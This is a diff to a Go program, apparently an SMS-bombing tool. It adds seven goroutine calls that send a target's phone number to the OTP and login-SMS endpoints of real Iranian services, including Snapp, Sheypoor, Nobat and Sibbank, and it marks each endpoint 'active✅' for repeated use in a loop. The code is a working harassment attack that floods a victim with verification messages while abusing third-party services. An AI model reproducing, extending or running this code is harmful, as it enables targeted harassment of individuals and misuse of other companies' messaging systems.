@@ -153,6 +153,27 @@ func main() {
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
 		}, ch)    //active✅
+		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)  // active✅
+		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // active✅
+		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
+		 	"cellphone": phone,
+                }, ch) // active✅
+		go sms("https://api.nobat.ir/patient/login/phone", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active✅
+		go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
+			"username": phone,
+		}, ch)  // active✅
+		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // active✅
+		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // active✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
